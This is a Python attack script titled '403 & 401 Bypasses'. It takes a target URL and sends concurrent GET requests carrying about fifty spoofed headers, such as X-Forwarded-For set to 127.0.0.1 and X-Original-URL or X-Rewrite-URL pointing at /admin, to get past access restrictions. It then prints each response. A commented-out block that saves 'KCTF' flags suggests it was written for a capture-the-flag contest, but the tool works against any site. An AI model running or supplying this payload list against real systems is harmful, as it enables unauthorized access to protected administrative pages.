import requests
from concurrent.futures import ThreadPoolExecutor

G = '\033[1;32m'
R = '\033[1;31m'

print((G+"""
  _____________ _____________  ___ ___    _____    _________ ___ ___ .___  _________
 /   _____/    |   \______   \/   |   \  /  _  \  /   _____//   |   \|   |/   _____/
 \_____  \|    |   /|    |  _/    ~    \/  /_\  \ \_____  \/    ~    \   |\_____  \ 
 /        \    |  / |    |   \    Y    /    |    \/        \    Y    /   |/        /
/_______  /______/  |______  /\___|_  /\____|__  /_______  /\___|_  /|___/_______  /
        \/                 \/       \/         \/        \/       \/             \/ 

"""))

print("403 & 401 Bypasses")

def make_request(url, headers):
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        return response.status_code, response.text
    except requests.exceptions.HTTPError as errh:
        pass
    except requests.exceptions.RequestException as err:
        pass

headers_array = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},
    {"Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-URL": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Cluster-Client-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-URL": "/admin/console"},
    {"Host": "localhost"},
    {"X-Rewrite-URL": "/admin/console"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1:80"},
    {"Content-Length": "0"},
    {"X-Host": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"Referer": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-Server": "127.0.0.1"},
    {"X-Forwarded-Proto": "https"},
    {"Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Forwarded-Port": "443"},
    {"X-Forwarded-For": "127.0.0.1, localhost, localhost.localdomain, 127.0.0.1:80"},
    {"X-Forwarded-Scheme": "https"},
    {"X-Forwarded-Path": "/admin"},
    {"X-Forwarded-Uri": "/admin"},
    {"X-Forwarded-For-Original": "127.0.0.1"},
    {"X-Forwarded-Host-Original": "127.0.0.1"},
    {"X-Forwarded-Server-Original": "127.0.0.1"},
    {"X-Forwarded-Proto-Original": "https"},
    {"X-Forwarded-Port-Original": "443"},
    {"X-Forwarded-Scheme-Original": "https"},
    {"X-Forwarded-Path-Original": "/admin"},
    {"X-Forwarded-Uri-Original": "/admin"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-User-Agent": "127.0.0.1"},
    {"X-Scanned-By": "127.0.0.1"},
    {"X-Forwarded-Method": "GET"},
    {"X-Original-Host": "127.0.0.1"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Override-URL": "/admin"},
    {"X-HTTP-DestinationURL": "/admin"},
    {"X-Path-Info": "/admin"}
]

url = input("Enter Full url you want to acess : ")

def header_bypass(headers):
		status_code, response_text = make_request(url, headers)
		payload_used = ", ".join(f"{key}: {value}" for key, value in headers.items())
		print(G+f"[*] {url} => [{payload_used}]")
		print(R+f"      ↳ [{status_code}] => {response_text}")
		# if "KCTF" in response_text:
		# 	with open("flag.txt", "w")as a :
        #         		a.write(response_text)

with ThreadPoolExecutor(2) as executor:
	results = executor.map(header_bypass, headers_array)
